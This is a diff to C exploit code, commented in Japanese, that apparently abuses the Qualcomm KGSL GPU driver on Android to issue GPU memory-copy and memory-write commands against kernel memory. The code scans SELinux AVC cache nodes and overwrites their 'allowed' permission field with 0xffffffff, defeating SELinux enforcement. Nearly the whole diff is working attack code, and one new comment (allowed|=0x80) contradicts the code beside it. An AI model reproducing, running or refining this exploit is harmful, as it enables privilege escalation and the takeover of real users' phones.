@@ -82,7 +82,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* AVC flip 定数 */
+/* AVC flip 定数 (DWARF 検証済み) */
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
 #define AVC_NODE_STRIDE  72
 #define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
@@ -378,10 +378,7 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return n;
 }
 
-/*
- * AVC ノードをスキャンし、(tsid==2 && tclass==1) のノードの allowed を 0xffffffff に書き換える
- * Snapdragon 855 用オフセット: ssid=0x20, tsid=0x24, tclass=0x28, allowed=0x2c
- */
+/* (tsid==2 && tclass==1 && allowed bit7==0) の avc_node を allowed|=0x80 で flip */
 static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                            void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                            uint64_t *vas, int npages, int verbose) {
@@ -398,17 +395,15 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         memset(dst_m, 0, node_dws * 4);
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
-
-        /* 各ページの AVC ノードを読み込む (オフセット 0x20 から) */
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
             for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                 uint64_t node_va = va + n * AVC_NODE_STRIDE;
+                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
                 for (int w = 0; w < 4; w++) {
                     uint32_t dl, dh, sl, sh;
-                    uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4 + w * 4;
-                    split64(dst_ga + dofs, &dl, &dh);
-                    split64(node_va + 0x20 + w * 4, &sl, &sh);  // ssid は 0x20 から
+                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
+                    split64(node_va + w * 4, &sl, &sh);
                     cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                     cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                     cmd[dw++] = sl; cmd[dw++] = sh;
@@ -421,7 +416,6 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
-        /* 条件に合うノードを探して allowed を書き換え */
         int fdw = 0, nb_flips = 0;
         uint32_t *fcmd = (uint32_t *)ib_m;
         fcmd[fdw++] = cp_type7(CP_NOP, 0);
@@ -429,14 +423,12 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             uint64_t va = vas[idx + p];
             for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                 uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
-                uint32_t ssid = nd[0];
-                uint32_t tsid = nd[1];
-                uint16_t tclass = (uint16_t)(nd[2] & 0xffff);
-                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                    /* allowed は 0x2c オフセット */
-                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + 0x2c;
+                /* 本物の AVC ノード判定: ssid は実在レンジ(1..0x3fff)、tsid==2 (SECURITY)、tclass==1。
+                   allowed を全ビット許容(0xFFFFFFFF)に書き換え、churn での置換後も効くようにする。 */
+                if (nd[0] >= 1 && nd[0] <= 0x3fff && nd[1] == 2 && nd[2] == 1) {
+                    uint64_t node_va = va + n * AVC_NODE_STRIDE + 0xc;
                     uint32_t sl, sh;
-                    split64(allowed_va, &sl, &sh);
+                    split64(node_va, &sl, &sh);
                     fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
                     fcmd[fdw++] = sl; fcmd[fdw++] = sh;
                     fcmd[fdw++] = 0xffffffff;
@@ -444,8 +436,8 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                     nb_flips++;
                     if (verbose)
                         printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
-                            (unsigned long)va, n * AVC_NODE_STRIDE + 0x2c,
-                            ssid, tsid);
+                            (unsigned long)va, n * AVC_NODE_STRIDE + 0xc,
+                            nd[0], nd[1]);
                 }
             }
         }
